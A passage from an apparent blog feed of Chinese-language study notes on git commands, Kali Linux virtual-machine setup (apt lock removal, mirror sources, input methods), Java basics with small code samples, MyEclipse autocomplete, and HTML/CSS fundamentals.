再把新建的分支删掉： git branch -d feature_x 除非你将分支推送到远端仓库，不然该分支就是 不为他人所见的： git push origin 7.更新与合并 要更新你的本地仓库至最新改动，执行： git pull 以在你的工作目录中 获取（fetch） 并 合并（merge） 远端的改动。 要合并其他分支到你的当前分支（例如 master），执行： git merge 在这两种情况下，git 都会尝试去自动合并改动。遗憾的是，这可能并非每次都成功，并可能出现冲突（conflicts）。 这时候就需要你修改这些文件来手动合并这些冲突（conflicts）。改完之后，你需要执行如下命令以将它们标记为合并成功： git add 在合并改动之前，你可以使用如下命令预览差异： git diff 8.标签 为软件发布创建标签是推荐的。这个概念早已存在，在 SVN 中也有。你可以执行如下命令创建一个叫做 1.0.0 的标签： git tag 1.0.0 1b2e1d63ff 1b2e1d63ff 是你想要标记的提交 ID 的前 10 位字符。可以使用下列命令获取提交 ID： git log 你也可以使用少一点的提交 ID 前几位，只要它的指向具有唯一性。 9.替换本地改动 假如你操作失误（当然，这最好永远不要发生），你可以使用如下命令替换掉本地改动： git checkout – 此命令会使用 HEAD 中的最新内容替换掉你的工作目录中的文件。已添加到暂存区的改动以及新文件都不会受到影响。</p><p>假如你想丢弃你在本地的所有改动与提交，可以到服务器上获取最新的版本历史，并将你本地主分支指向它： git fetch origin git reset –hard origin/master 10.实用小贴士 内建的图形化 git： gitk 彩色的 git 输出： git config color.ui true 显示历史记录时，每个提交的信息只显示一行： git config format.pretty oneline 交互式添加文件到暂存区： git add -i 11.图形化客户端 GitX (L) (OSX, 开源软件) Tower (OSX) Source Tree (OSX, 免费) GitHub for Mac (OSX, 免费) GitBox (OSX, App Store)</p>]]></content>
    
    
    <categories>
      
      <category>版本控制</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Spring笔记</title>
    <link href="/2019/04/01/spring%E7%AC%94%E8%AE%B0/index/"/>
    <url>/2019/04/01/spring%E7%AC%94%E8%AE%B0/index/</url>
    
    <content type="html"><![CDATA[<p>Spring概念 1. Spring是一个开源的轻量级的框架 2. Spring核心主要两部分 (1) Aop面向切面编程，扩展功能不是修改源代码实现 (2) Ioc控制反转， 比如说有一个类，在类里面有方法（不是静态的方法），调用类里面的方法，创建类的对象，使用对象调用方法，创建类的过程，需要new出来对象 把对象的创建不是通过new方法实现，而是交给 3. 是一站式框架</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>编码命名规范</title>
    <link href="/2019/04/01/%E7%BC%96%E7%A0%81%E5%91%BD%E5%90%8D%E8%A7%84%E8%8C%83/index/"/>
    <url>/2019/04/01/%E7%BC%96%E7%A0%81%E5%91%BD%E5%90%8D%E8%A7%84%E8%8C%83/index/</url>
    
    <content type="html"><![CDATA[<p>在编码过程中，命名是重头戏。好的命名可以令代码赏心悦目，带来愉悦的阅读享受，令代码具有良好的可维护性。命令的主要范畴有变量、常量、方法、类、文件、包等。 1.变量命名 变量名都采用小驼峰式命名，即除了第一个单词的首字母不大写外，每个单词的首字母都大写，词与词之间没有任何符号包括下划线。</p><p>2.方法命名 方法命名与变量命名一样，采用小驼峰式命名。与变量不同的是，方法名尽量采用动词或判断型词汇，例如get、set、is等。</p><p>3.类命名 类命名采用大驼峰式命名，即所有单词的首字母都大写。</p><p>4.常量命名 作为常量时，单词的所有字母都大写，并用下划线分割。</p><p>5.文件命名 命名文件时，请尽量采用下划线分割单词，如果你不想将文件暴露给其他用户（私有），可以约定以下划线开头，_linklist.js。 6.包名 在包名中，尽量不要包含重复字样。包名应当适当短并且有意义。</p>]]></content>
    
    
    <categories>
      
      <category>杂七杂八区</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>kali Linux</title>
    <link href="/2019/03/23/kalilinux/index/"/>
    <url>/2019/03/23/kalilinux/index/</url>
    
    <content type="html"><![CDATA[<p>在之前的kali系统删除以后，今天又重新安装了一下kali，结果竟然遇到了好神奇的问题，记录下</p><p>1.Kali联网 先找到虚拟机/设置/网络适配器，选择NAT模式（各种模式的区别），然后（在虚拟机关机的前提下），编辑/虚拟网络适配器/更改设置，选择还原默认设置，等待完成后，再次开机就有网</p><p>2.无法获得锁（百度了一下，有两个方法） （1）终端输入 ps aux ，列出进程。找到含有apt-get的进程，直接sudo kill PID。 （2）强制解锁,命令（这个不懂，我用的第一个方法，明天研究下） sudo rm /var/cache/apt/archives/lock sudo rm /var/lib/dpkg/lock</p><p>3.无法定位包问题 再次百度了一下，竟然是没有配置源，好傻好傻，以为下载后自动配置好了的，果然新版本的不一样 配置源方法：终端，vim /etc/apt/sources.list编辑sources.list文件 下面是百度好的源（来自大佬们，感谢），直接粘贴到里面就可以了 #官方源 deb <a href="http://http.kali.org/kali">http://http.kali.org/kali</a> kali main non-free contrib deb-src <a href="http://http.kali.org/kali">http://http.kali.org/kali</a> kali main non-free contrib deb <a href="http://security.kali.org/kali-security">http://security.kali.org/kali-security</a> kali/updates main contrib non-free #激进源，新手不推荐使用这个软件源 deb <a href="http://repo.kali.org/kali">http://repo.kali.org/kali</a> kali-bleeding-edge main deb-src <a href="http://repo.kali.org/kali">http://repo.kali.org/kali</a> kali-bleeding-edge main #中科大kali源 deb <a href="http://mirrors.ustc.edu.cn/kali">http://mirrors.ustc.edu.cn/kali</a> kali main non-free contrib deb-src <a href="http://mirrors.ustc.edu.cn/kali">http://mirrors.ustc.edu.cn/kali</a> kali main non-free contrib deb <a href="http://mirrors.ustc.edu.cn/kali-security">http://mirrors.ustc.edu.cn/kali-security</a> kali/updates main contrib non-free #阿里云kali源 deb <a href="http://mirrors.aliyun.com/kali">http://mirrors.aliyun.com/kali</a> kali main non-free contrib deb-src <a href="http://mirrors.aliyun.com/kali">http://mirrors.aliyun.com/kali</a> kali main non-free contrib deb <a href="http://mirrors.aliyun.com/kali-security">http://mirrors.aliyun.com/kali-security</a> kali/updates main contrib non-free</p><p>4.安装中文输入法 命令：apt-get install fcitx fcitx-googlepinyin 之后去所有应用程序界面你就能看到企鹅图标，但是配置里面没有谷歌拼音输入法怎么办，不要慌，直接reboot重启，再打开企鹅图标，是不是就有了</p><p>5.安装java ide，个人比较推荐eclipse，用着比较顺手，但是也有大佬推荐NetBeans，这个看自己的意愿 方法（以eclipse为例）：下载好eclipse安装包，进去解压，命令：tar -zxvf eclipse文件名称直接复制过来就好 然后会出现一个文件夹，里面有可运行的文件，直接运行就好了 之后选择代码存放位置，自己决定 正确完成，图请自行百度</p><p>今天太晚了，就先写到这里吧 最后感谢各位大佬们的无私帮助，谢谢！</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Java复习笔记</title>
    <link href="/2019/03/20/java%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/index/"/>
    <url>/2019/03/20/java%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/index/</url>
    
    <content type="html"><![CDATA[<p>一、 cmd编译，cd进入文件路径，javac 项目名.java， 执行：java 项目名 二、 编码标准 定义包名：com/cn等等.企业名 定义类名：开头大写字母+英文名_大写字母_方式 三. 编译版本与执行版本不一致</p><p>基本数据类型 1.四种整数类型(byte、short、int、long):byte：8 位，用于表示最小数据单位，如文件中数据，-128<del>127 short：16 位，很少用，-32768 ~ 32767 int：32 位、最常用，-2^31-1</del>2^31（21 亿） long：64 位、次常用 注意事项： int i=5; // 5 叫直接量（或字面量），即直接写出的常数。 整数字面量默认都为 int 类型，所以在定义的 long 型数据后面加 L或 l。小于 32 位数的变量，都按 int 结果计算。 强转符比数学运算符优先级高。见常量与变量中的例子。 2.两种浮点数类型(float、double)： float：32位，后缀 F 或 f，1位符号位，8位指数，23位有效尾数。 double：64 位，最常用，后缀 D 或 d，1位符号位，11位指数，52位有效尾 注意事项：二进制浮点数:1010100010=101010001.0*2=10101000.10*2^10（2次方)=1010100.010*2^11(3次方)= . 1010100010*2^1010(10次方) 尾数： . 1010100010 指数：1010 基数：2浮点数字面量默认都为double类型，所以在定义的float型数据后面加F 或 f；double类型可不写后缀，但在小数计算中一定要写D或 X.X float的精度没有 long 高，有效位数（尾数）短。 float的范围大于 long指数可以很大。 浮点数是不精确的，不能对浮点数进行精确比较。 3.一种字符类型(char)： char：16位，是整数类型，用单引号括起来的1个字符（可以是一个中文字符），使用Unicode码代表字符，0~2^16-1（65535） 。 注意事项：不能为 0个字符。 转义字符：\n换行,\r 回车,\t Tab字符,\“ 双引号,\\ 表示一个\,两字符char中间用“+”连接，内部先把字符转成 int 类型，再进行加法运算，char本质就是个数！二进制的，显示的时候，经过“处理”显示为字符 4.一种布尔类型(boolean)：true真和false假。 5.类型转换：char–&gt;自动转换：byte–&gt;short–&gt;int–&gt;long–&gt;float–&gt;double 强制转换：①会损失精度，产生误差，小数点以后的数字全部舍弃。②容易超过取值范围。 6.记忆：8位：Byte（字节型），：short（短整型）、char（字符型），32位：int（整型）、float（单精度型/浮点型），64位：long（长整型）、double（双精度型），最后一个：boolean(布尔类型 7.整形的字面值类型是int，byte、short、char、在范围内可以直接赋int值。浮点类型的字面值double。类型后缀，long、double、float</p><p>数组 Arrays.toString（）方法：将数组转换为字符串 Arrays.sort（）方法，默认给数组做从小到大排序 数组扩容 int arr[]=new int[1]; int arr={1,2}; Arrays.copyOf(original,newLength) Orginal：代表要复制的数组 newLength：新长度 1. 新长度比原来长度小 2. 新长度和原长度一样 3. 新长度比原长度长 /**********原数组全复制下来后用0补位</p><p>ArrayIndexOutOfBoundsException 数组下标越界异常</p><p>面向对象特点 1. 符合人们的思考习惯 2. 将复杂问题简单化，由过程编程转为面向对象 3. 使过程中的执行者成为对象的指挥者</p><p>Java语言对现实事物进行描述，通过类的形式来体现 描述方式：事物的属性和行为</p><p>只要明确事物的属性和行为并定义在类中 对象就是该类事物实实在在存在的个体</p><p>类与对象的关系：事物的描述 对象：该类事物的实例，通过new来创建</p><p>注意：java中所有的关键字都是小写的，String是类不是关键字以及基本类型</p><p>定义类就是定义类中的成员 成员：成员变量属性，成员变量行为</p><p>成员变量和局部变量的区别 1.成员变量定义在类中，整个类都可以访问 局部变量定义在函数，语句，局部代码块中，只在所属区域有效 2.成员变量存在于堆内存的方法中 局部变量存在于栈内存的方法中 3.成员变量随着对象的创建而存在，随着对象的消失而消失 局部变量随着所属区域的执行而存在，随着所属区域的结束而释放 4.成员变量都有默认初始值 局部变量没有初始值</p><p>在类中定义成员变量赋值时是显式初始化，对象的属性赋值后被清除，无需显式初始化，java默认给隐式初始化赋值</p><p>类类型的变量要指向对象，否则就是null</p><p>匿名对象：没有名字的对象， new 类名（）； //匿名对象其实就是对象的简写格式</p><p>类名 对象名=new 类名（） 对象名.方法（）；</p><p>当对象方法仅进行一次调用时候就可以简化为匿名对象+</p><p>toString方法 重写toString方法后输出对象就会输出toString方法重写后的。</p><p>传参 1.基本类型传参： public class Transfer_parameters { public static void main(String[] args){ int x=3; show(x); System.out.print(x); } static void show(int x){ x=4; } } /**********方法结束后局部变量消失*/； 2.引用类型传参 class demo{ int a; public static void run(demo d){ d.a=4; } } public class Transfer_parameters_2 { public static void main(String[] args){ demo d=new demo(); d.a=9; d.run(d); System.out.print(d.a); } } /*********传参后经过方法改变属性，会被方法所改变；*/ 4. 数组传参排序</p><p>public class Sort { public static void main(String[] args) { int[] a={5,6,4,7}; Orr(a); } static void Orr(int a[]){ //第一次循环，是确定一个数依次和后面数的比较的数。 for (int i = 0; i &lt; a.length -1 ; i++) { //这个是和第一个数的比较的数 for (int j = i+1; j &lt; a.length; j++) { //定义一个临时的变量，用来交换变量 int temp ; if(a[i]&gt;a[j]){ temp = a[i]; a[i] = a[j]; a[j] = temp; } } } for(int x=0;x</p><p>封装，是指隐藏对象的属性和实现细节，仅对外提供公共访问方式 私有属性只在类内可访问，外界不可访问 好处：将变化隔离，便于使用，提高重用性，提高安全性 封装原则：将不需要对外提供的内容都隐藏起来，把属性都隐藏，提供公共方法对其访问 package q.Review;</p><p>class person{ private int age; public void setAge(int a){ if(a&gt;0&amp;&amp;a&lt;130){ age=a; } } public int getAge(){ return age; } void show(){ System.out.print(age); } } public class Encapsulation { public static void main(String[] args){ person a=new person(); a.setAge(10); a.show(); } }</p><p>Private关键字：是一个权限修饰符，用于修饰成员（成员变量和成员函数），被私有化的成员只在本类中有效 常用：将成员变量私有化对外提供get ，set 方法对其进行访问，提高数据访问的安全性。 set方法一般是void，get返回类型和属性类型相同</p><p>构造函数 特点：函数名与类名相同，不用定义返回值类型，没有具体的返回值 作用：给对象进行初始化 注意：默认构造函数的特点，多个构造函数是以重载的形式存在的。 在构建创造对象是所调用，可以给对象进行初始化。 一个类中如果没有定义过构造函数，那么该类中会有一个默认的构造函数，如果类中定义了指定的构造函数，那么类中的默认构造函数就没有了。</p><p>构造函数和一般函数的区别 构造函数：对象创建时，就会调用与之相对应的构造函数，对对象进行初始化 一般函数：对象创建后需要函数功能时才能使用 构造函数：对象创建时，会调用只调用一次 一般函数：对象创建后，可以调用多次</p><p>package q.Review;</p><p>class Per{ int age; Per(){ System.out.println(“success”); } void speak(){ System.out.print(“speak”); } } public class ConstructorFun { public static void main(String[] args){ Per P=new Per(); P.speak(); P.speak(); P.speak(); } }</p><p>定义构造函数的时候：在描述事物时，该事物已存在就具备的一些内容，这些内容都定义在构造函数中。</p><p>重载 package q.Review;</p><p>class Pers{ private int age; private String name; Pers(){ } Pers(String n){ name=n; } Pers(String n,int a){ name=n; age=a; } void speak(){ System.out.println(age+name); } } public class Overloaded { public static void main(String[] args){ Pers P0=new Pers(); P0.speak(); Pers p1=new Pers(“旺财”); p1.speak(); Pers p2=new Pers(“旺财”,10); p2.speak(); } }</p><p>函数名或者方法名有相同，参数列表或参数类型不相同。 1. 重载发生在一个类里 2. 重载的方法名相同 3. 重载的参数列表不一样 4. 重载的方法体不同 参数列表不同的点： 1. 参数类型 2. 参数个数 3. 参数类型相同并且参数个数相同，传参顺序不同，参数列表也不同</p><p>this关键字 特点：代表其所在函数所属对象的引用， 当在函数内需要用到调用该函数的对象时，就用this 当成员变量和局部变量重名时可以用关键字this来区分 this代表当前对象 this就是所在函数所属对象的引用 简单说，哪个对象调用了this所在的函数，this就代表哪个对象</p><p>static关键字 static是一个修饰符，用来修饰成员 static修饰的成员被所有对象所共享 static优先于对象存在，因为static的成员随着类的加载就已经存在了 static修饰的成员多了一种调用方式，就可以直接被类名所调用。格式：类名.静态成员 static修饰的数据是共享数据，对象的存储是特有数据</p><p>class personStatic{ String name; //成员变量，实例变量 static String country=”CN”; //静态变量，类变量 public void show(){ System.out.println(country+” :”+name); } } public class staticKeyword { public static void main(String[] args){ personStatic p=new personStatic(); p.name=”小强”; p.show(); System.out.println(p.country); System.out.print(personStatic.country); } }</p><p>成员变量和静态变量的区别 1.两个变量的生命周期不同 成员变量随着对象的创建而存在，随着对象的被回收而释放 静态变量会随着雷德加载而存在，随着类的消失而消失（一般随着虚拟机的结束类消失） // 不用静态的原因有一部分是因为生命周期太长 2.调用方式不同 成员变量只能被对象调用 静态变量可以被对象调用，还可以被类名调用 3.别名不同 成员变量也成为实例变量 静态变量称为类变量 4.位置不同 成员变量数据存储在堆内存的对象中，所以也叫对象的特有数据 静态变量数据存储在方法区（共享数据区）的静态区，所以也叫对象的共享数据</p><p>静态使用注意事项： 1.静态方法只能访问静态成员（成员变量和成员函数），非静态既可以访问静态又可以访问非静态 2.静态方法中不可以使用this或者super关键字（原因是无对象） 3.主函数是静态的（调用方式如下） public class staticSecond { int num=10; public static void main(String[] args){ new staticSecond().show(); } public void show(){ System.out.print(num); } }</p><p>继承 在继承的关系中，子类就是一个父类，也就是说，子类可以被当做父类看待</p><p>定义父类格式（一个普通的类定义）： public class 父类名称{</p><p>} 定义子类格式 public class 子类名称 extends 父类名称{</p><p>}</p><p>无法继承： 父类的私有属性子类无法继承 父类的构造函数</p><p>在父子类的继承关系中，如果成员变量重名，则创建子类对象时，访问有两种方式 直接通过子类对象访问成员变量： 等号左边是谁，就优先用谁，没有则向上找 间接通过成员方法访问成员变量： 该方法属于谁，就优先用谁，没有则向上找 Demo01ExtendsField package q.Extends; public class Demo01ExtendsField { public static void main(String[] args){ FatherClass fa=new FatherClass();//创建父类对象 System.out.println(fa.numFa);//只能使用父类的东西，没有任何子类内容 System.out.println(“===========”); Son s=new Son(); System.out.println(s.numFa);//10 System.out.println(s.numSon);//20 System.out.println(“===========”); //等号左边是谁，就优先用谁 System.out.println(s.num);//优先子类 //System.out.println(s.abc);//到处都没有，编译报错 System.out.println(“===========”); //这个方法是子类的，优先用子类的，而没有向上找 s.methodZi(); //这个方法是在父类定义的 s.methodFu();//100 } }</p><p>FatherClass public class FatherClass { int numFa=10; int num=100; public void methodFu(){ //使用本类当中的不会向下找 System.out.println(num); } }</p><p>son package q.Extends; public class Son extends FatherClass{ int numSon=20; int num=200; public void methodZi(){ //因为本类中有，所以用本类的 System.out.println(num); } } @Override是伪代码,表示重写(当然不写也可以)，不过写上有如下好处: 1、可以当注释用,方便阅读； 2、编译器可以给你验证@Override下面的方法名是否是你父类中所有的，如果没有则报错。例如，你如果没写@Override，而你下面的方法名又写错了，这时你的编译器是可以编译通过的，因为编译器以为这个方法是你的子类中自己增加的方法。 举例：在重写父类的onCreate时，在方法前面加上@Override 系统可以帮你检查方法的正确性。 重写： 1. 重写发生在父子类中 2. 重写的方法名称相同 3. 重写的参数列表相同 4. 重写的方法体不同 5. 父类的方法不满足子类的需求</p><p>5. 重载发生在一个类里 6. 重载的方法名相同 7. 重载的参数列表不一样 8. 重载的方法体不同</p><p>多态 1.向上造型：将父类型的引用指向子类型的对象 2.向下造型：将指向子类型对象的父类型引用 再转回子类型 强制类型转换</p><p>抽象 抽象方法：就是加上abstract关键字然后去掉大括号，直接分号结束 抽象类：抽象方法所在的类必须是抽象类才行，在class之前写上abstract即可 抽象类声明： public abstract class 类名{</p><p>} 没有方法体 一个类继承了抽象类，必须实现父类的抽象方法，不能直接创建抽象类对象，必须用一个子类来继承抽象父类，子类必须覆盖重写父类中的所有抽象方法 覆盖重写（实现）：子类去掉抽象方法的abstract关键字，然后补全方法体大括号 创建子类对象时使用 一个抽象类不一定含有抽象方法，只要保证抽象方法所在的类是抽象类即可，这样没有抽象方法的抽象类，也不能直接创建对象，在一些特殊场景下有用途 注意： 1. 抽象类不能创建对象，如果创建就会报错只能创建其非抽象子类的对象 理解：假设创建了抽象类的对象，调用抽象的方法，而抽象方法没有具体的方法体，没有意义 2. 抽象类中可以有构造方法，是供子类创建对象时初始化父类成员使用的 理解：子类的构造方法中，有默认的super（），需要访问父类的构造方法 3. 抽象类中，不一定包含抽象方法，但是有抽象方法的类必定是抽象类 理解：未包含抽象方法的抽象类，目的就是不让调用者创建该类对象，通常用于某些特殊的类结构设计 4. 抽象类的子类必须重写父类的所有抽象方法，否则无法编译并报错，除非该子类也是抽象类。 理解：假设不重写所有抽象方法，则类中可能包含抽象方法，那么创建对象后，调用抽象的方法，没有意义</p><p>接口：与类同级 类：属性 行为 静态常量</p><p>继承只能单继承 实现可以多实现</p><p>继承在前实现在后</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MyEclipse自动补全</title>
    <link href="/2019/03/20/myeclipse%E8%87%AA%E5%8A%A8%E8%A1%A5%E5%85%A8/index/"/>
    <url>/2019/03/20/myeclipse%E8%87%AA%E5%8A%A8%E8%A1%A5%E5%85%A8/index/</url>
    
    <content type="html"><![CDATA[<p>1. 打开MyEclipse 6.5，然后“window”→“Preferences”。 2. 选择“java”，展开，“Editor”，选择“Content Assist”。 3. 选择“Content Assist”，然后看到右边，右边的“Auto-Activation”下面的“Auto Activation triggers for java”这个选项。其实就是指触发代码提示的就是“.”这个符号。 4.“Auto Activation triggers for java”这个选项，在“.”后加abc字母，方便后面的查找修改。然后“apply”，点击“OK”。 5. 然后，“File”→“Export”，在弹出的窗口中选择“Perferences”，点击“下一步”。 6. 选择导出文件路径，本人导出到桌面，输入“test”作为文件名，点击“保存”。 7. 在桌面找到刚在保存的文件“test.epf”,右键选择“用记事本打开”。 8. 可以看到很多配置MyEclipse 6.5的信息 9. 按“ctrl F”快捷键，输入“.abc”，点击“查找下一个”。 10. 查找到“.abc”的配置信息。 11. 把“.abc”改成“.abcdefghijklmnopqrstuvwxyz(,”，保存，关闭“test.epf”。 12. 回到MyEclipse 6.5 界面，“File”→“Import”，在弹出的窗口中选择“Perferences”，点击“下一步”，选择刚在已经修改的“test.epf”文件，点击“打开”，点击“Finish”。该步骤和上面的导出步骤类似。</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>前端复习笔记</title>
    <link href="/2019/03/13/%E5%89%8D%E7%AB%AF%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/index/"/>
    <url>/2019/03/13/%E5%89%8D%E7%AB%AF%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/index/</url>
    
    <content type="html"><![CDATA[<p>一、基本结构<br>//设置字符编码集格式<br>//<br>//网页头部  </p><p>二、文本标记<br>1.加粗 b<br>2.倾斜 i<br>3.下划线 u<br>4.删除线 u<br>5.上标 sup<br>6.下标 sub<br>三、引用css样式表的方式<br>1.内联样式<br>在元素的开始标签里，设置一个style属性，并设置对应的属性名及属性值<br>例：</p><p>使用场景：js里，使用js给元素添加样式<br>2.内部样式表<br>在head标签里加上一对style标签，并且在style标签设置对应的样式<br><br> 样式规则<br><br>3.外部样式表<br>新建一个css样式表文件，并在文件中设置对应的样式通过link属性，将html文件与css文件关联在一起<br>四.css语法规范<br>选择器{<br>属性名：属性值；<br>}<br>元素选择器-以元素标签作为选择器<br>五、其他元素<br>1.标题元素hn（n=1<del>6）<br>特点：a.从h1到h6文本大小依次减小<br>b.文本加粗<br>c.每行文本上下都有距离<br>d.独占一行<br>2.段落元素 p<br>特点：a.每行文本上下有距离<br>b.独占一行<br>c.一般应用于纯文本<br>注意：不要和其他块级元素嵌套<br>3.块级元素&amp;行级元素<br>a.块级元素<br>默认情况下，独占一行<br>div，h1</del>h6，p<br>b.行内元素<br>默认情况下，可以和其他元素在一行内显示<br>span，b，++++++++++++++++++++++++++++++，u，s，sup，sub<br>4.实业字符<br>1.空格  <br>2.&lt; &lt;<br>3. &gt;<br>4.© ©<br>5.¥ ¥<br>六、其他常用样式<br>/*背景颜色*/<br>background-color：red；<br>/*文本尺寸*/<br>font-size：25px;<br>/*文本加粗*/<br>font-weight:bold;<br>/*文本修饰*/<br>text-decoration:none/underline;<br>text-decoration:underline;<br>/*文本排列*/<br>/*text-align：left/center/right；</p><p>七、图片<br>1.图片的分类<br>a.jpeg -压缩比例比较大，图片大小（小）<br>b.png -支持透明背景，无损压缩<br>c.gif -支持动图<br>2.语法 img<br>必须的属性 src=“要引用的图片资源的路径”；<br>width/height<br>注：当只设置宽度或者高度其中的一个属性时，另一个属性会等比缩放<br>3.路径<br>a. -绝对路径<br>b. -相对路径<br>相对于正在编辑的网页找想要使用的资源<br>返回上一级 ../<br>文件夹上的资源 文件夹名称/图片名称<br>c. -根相对路径<br>4.圆角图片<br>border-radius：px/%；<br>直角变圆角</p><p>八、超链接<br>1.定义：链接又叫超链接，允许用户进行点击操作完成页面跳转<br>2.语法<br>3.属性<br>必须的属性href=“跳转到资源的地址”；<br>如果没有href属性，a就不是链接<br>target 控制新页面以什么样的方式打开<br>4.特殊用法<br>href=“#”；默认会有一个返回顶部的效果<br>5.锚点<br>a.定义锚点  </p><p>b.链接到锚点<br><a href="%E9%94%9A%E7%82%B9%E5%90%8D%E7%A7%B0"></a><br>如果需要跳转到其他页面的指定位置<br><a href="demo.html#%E9%94%9A%E7%82%B9%E5%90%8D%E7%A7%B0"></a><br>6.伪类选择器<br>给元素添加一些特殊的效果<br>语法：选择器:伪类选择器<br>7.css链接<br>a.当链接没有被访问的样式 :link<br>b.当链接已经被访问过的样式 ：visited<br>c.当鼠标移动到链接上的样式 ：hover –重点<br>d.当链接被选中时的样式 ：active</p><p>八、列表<br>1.概念：将一些具有相同或者相似特征的元素进行以整齐的排列<br>2.分类：有序列表ol，无需列表ul<br>3.语法：定义列表-&gt;书写列表li<br>4.属性：type - 定义列表项标识的样式<br>有序列表的取值：1/a/A/i/I<br>无序列表的取值：circle/square<br>有序列表独有的属性： start -&gt; 取值：阿拉伯数字<br>5.css列表<br>list-style-type：none； -使用css的方式去掉列表项标识<br>6.注意：今后能用无序列表的地方就用无序列表，有序列表尽量少用，不利于seo<br>九、尺寸<br>1.常用尺寸单位<br>a -%<br>b -px<br>c -em相对于父元素的尺寸<br>d -rem相对于根元素的尺寸<br>2.常用颜色单位<br>a. -rgb（x，x，x）<br>x-&gt;0<del>255之间的数字，绝大部分用于js中随机生成随机颜色<br>b. - #rrggbb<br>6位十六进制数字 1</del>9 a<del>f<br>简写： #rgb<br>c. -英文单词<br>3.设置尺寸的元素<br>a.能够设置尺寸的属性<br>i.所有的块级元素都能设置尺寸<br>div，h1</del>h6，p，ol，ul，li<br>ii.一些能够设置尺寸的HTML元素<br>img，canvas，video<br>b.不能设置尺寸的属性<br>i大部分的行内元素都不不能设置尺寸<br>span，i，b，u，s，sup，sub</p><p>十.浮动<br>1.语法 float<br>2.取值 none/left/right<br>3.概述<br>a.浮动的元素会脱离文档流，不占据页面空间<br>b.浮动的元素会停靠在包含框的左边或右边<br>c.浮动的元素依然会位于包含框之内<br>d.如果浮动的元素前已经有了一个已经浮动的元素，那么他会停靠在这个元素的左边或右边<br>e.浮动是专门用于解决块级元素在一行显示的问题<br>4.清除浮动<br>目的：解决后续元素受浮动影响的问题<br>语法：clear<br>取值：none/left/right/both（常用）；<br>5.浮动对父元素的影响（父元素为0的问题）<br>解决方案<br>a.直接给父元素添加一个高度<br>b.使用清除浮动的方式<br>c.让父元素也浮动起来<br>d.overflow：hidden； //溢出隐藏（下拉菜单不能用）<br>十二.过渡<br>1.语法 transition：过渡属性 过渡时间 过渡速度函数 过渡延迟；<br>注意：延迟一般不设置 默认是不延迟（0s）<br>过渡属性：只要是带数值的属性都可以过渡<br>all-所有发生变化的属性都过渡<br>过渡时间：.3s/.4s是用户体验最好的过渡时间<br>过渡速度函数： linear -匀速的<br>2.常用方法：all/.3/linear<br>十三.框模型<br>1.内边距<br>a.语法：padding：n px；<br>b.定义：围绕在元素周围的空白领域<br>c.取值<br>padding：值1；<br>值1：上下左右四个方向的外边距<br>padding：值1 值2：<br>值1.上下外边距<br>值2.左右方向外边距<br>padding：值1 值2 值3<br>值1：上外边距<br>值2：左右外边距<br>值3：下外边距<br>padding：值1 值2 值3 值4；<br>d-单边定义<br>padding-方向：n px；<br>方向：top/right/bottom/left<br>2.外边距<br>a.语法：margin：n px；<br>b.定义：围绕在元素周围的空白领域<br>c.取值<br>margin：值1；<br>值1：上下左右四个方向的外边距<br>margin：值1 值2：<br>值1.上下外边距<br>值2.左右方向外边距<br>margin：值1 值2 值3<br>值1：上外边距<br>值2：左右外边距<br>值3：下外边距<br>margin：值1 值2 值3 值4；<br>margin：auto；<br>注意：auto只能控制左右方向自动居中（上下无效）<br>d-单边定义<br>margin-方向：n px；<br>方向：top/right/bottom/left<br>3.特殊<br>a.元素实际所占大小计算方式<br>元素实际所占宽度=元素内容宽度+左右内边距+左右边框+左右外边距<br>元素实际所占高度=元素内容高度+上下内边距+上边边框+上下外边距<br>b.改变元素所占大小计算方式<br>box-sizing：border-box<br>使我们设置的内容的大小包含元素内容、内边距以及边框的大小<br>十四、边框<br>1.语法border<br>2.简写方式 border：边框宽度 边框样式 边框颜色；<br>样式：solid -实线的<br>3.单边定义<br>border-方向：xpx<br>4.特殊用法<br>使用边框实现三角形<br>设置元素宽度、高度为0，并只设置其中一个边的边框<br>5.特殊的颜色<br>透明色 transparent<br>6.边框倒角<br>直角变圆角<br>border-radius：px/%；<br>边框倒角的单边定义<br>border-上下方向-左右方向-radius：px/%；</p><p>十四.背景<br>1.背景颜色 background-color：合法颜色值；<br>2.背景图像 background-image：url（“要引用图像的路径”）；<br>注意：如果背景图像和背景颜色同事设置的话背景图像会压在背景颜色的上边<br>3.背景平铺 background-repeat：none/repeat-x/repeat-y/no-repeat；<br>4.背景尺寸 background-size：w h； -&gt;px/%<br>5.背景图像定位 background-position：x y；<br>x-x方向偏移量<br>取正：背景图像向右移动<br>取负：背景图像向左移动<br>x-y方向偏移量<br>取正-背景图像向下移动<br>取负-背景图像向上移动<br>配合精灵图使用 -&gt;图像拼合技术<br>将多个小图放在一张大图中显示<br>如何显示精灵图中的某些小图<br>a.创建一个和想要显示小图一样大的元素<br>b.将精灵图作为背景图像引入元素中，并使用背景图像定位的方式移动背景图像，以便显示要显示的小图<br>注意：背景图像定位的取值一定是&lt;=0的<br>6.背景简写方式<br>background：背景颜色 背景图像 背景平铺 背景图像定位；</p><p>十五、定位<br>1.相对定位<br>语法：a.相对定位的元素师不脱离文档流<br>b.相对于自身的位置进行偏移<br>c.配合偏移属性来使用（top/right/bottom/left）<br>d.绝大部分会配合绝对定位使用<br>使用场合：用于网页元素位置的微调<br>2.绝对定位<br>语法：position：absolute；<br>特点：a脱离文档流，不占据页面空间<br>b.配合偏移属性使用<br>c.相对于最近的已经定位的祖先元素进行定位<br>d.如果没有已经定位的祖先元素，那么它会相对于最初的包含框进行定位<br>e.使用绝对定位来完成元素位置的初始化<br>使用场合：下拉菜单，网页布局<br>3.固定定位<br>语法：position：fixed；<br>特点： a.脱离文档流，不占据页面空间<br>b.配合偏移属性使用<br>c.相对于最初的包含框进行定位<br>使用场合：返回顶部，吸顶灯</p><p>十六.表格<br>table -定义表格<br>tr -定义行<br>td 